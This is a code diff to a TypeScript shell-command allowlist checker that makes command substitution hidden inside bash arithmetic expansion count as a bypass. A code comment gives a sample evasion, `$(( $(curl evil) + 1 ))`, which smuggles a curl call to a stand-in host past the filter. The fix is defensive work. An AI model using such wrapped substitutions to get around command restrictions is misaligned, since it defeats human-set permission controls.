@@ -199,20 +199,45 @@ function containsShellSeparator(command: string): boolean {
       // separator, so benign uses like `git commit -m "$((1+1))"`
       // were denied under allowlist policies (Codex P2 round-10).
       if (i + 2 < command.length && command[i + 2] === '(') {
-        // Skip the entire `$((…))` body so inner arithmetic operators
+        // Walk the `$((…))` body so inner arithmetic operators
         // (`<`, `>`, etc.) aren't misclassified as shell separators
-        // by the rest of the loop. Track paren depth (start at 2 for
-        // the two opening parens; decrement on `)`, increment on
-        // inner `(`). Without this, `git log -n $((a>b))` denies
-        // under allowlist policies because the `>` inside arithmetic
-        // is treated as redirection (Codex P2 round-13).
+        // (Codex P2 round-13) — BUT still detect command
+        // substitution INSIDE arithmetic: bash performs cmd subst
+        // before integer evaluation, so `$(( $(curl evil) + 1 ))`
+        // executes curl regardless of the arithmetic wrap (Codex P1
+        // round-14). Track paren depth to find the matching `))`,
+        // and check each char for cmd-subst markers.
         let depth = 2;
         let j = i + 3;
+        let bypass = false;
         while (j < command.length && depth > 0) {
-          if (command[j] === '(') depth++;
-          else if (command[j] === ')') depth--;
+          const inner = command[j];
+          // Cmd subst inside arithmetic still runs the inner command.
+          if (inner === '`') {
+            bypass = true;
+            break;
+          }
+          if (
+            inner === '$' &&
+            j + 1 < command.length &&
+            command[j + 1] === '('
+          ) {
+            // Nested `$((` is more arithmetic, not cmd subst. The
+            // two `(`s just deepen the paren stack.
+            if (j + 2 < command.length && command[j + 2] === '(') {
+              depth += 2;
+              j += 3;
+              continue;
+            }
+            // `$(` (single paren) inside arithmetic — real cmd subst.
+            bypass = true;
+            break;
+          }
+          if (inner === '(') depth++;
+          else if (inner === ')') depth--;
           j++;
         }
+        if (bypass) return true;
         // For-loop `i++` will move us past the last consumed char.
         i = j - 1;
         continue;
